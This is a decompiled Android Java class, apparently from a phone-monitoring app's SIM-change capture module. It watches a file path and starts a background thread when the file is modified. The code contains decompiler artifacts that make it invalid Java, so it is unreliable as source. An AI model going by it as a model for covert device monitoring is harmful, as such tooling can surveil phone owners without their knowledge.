package com.vvt.capture.simchange;

import android.os.FileObserver;

class b
  extends FileObserver
{
  private Thread b = null;
  
  public b(SimChangeCapture paramSimChangeCapture, String paramString)
  {
    super(paramString, 2);
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    Thread localThread = this.b;
    if (localThread == null)
    {
      boolean bool = SimChangeCapture.d();
      if (bool) {}
      localThread = new java/lang/Thread;
      c localc = new com/vvt/capture/simchange/c;
      localc.<init>(this);
      localThread.<init>(localc);
      this.b = localThread;
      localThread = this.b;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/simchange/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */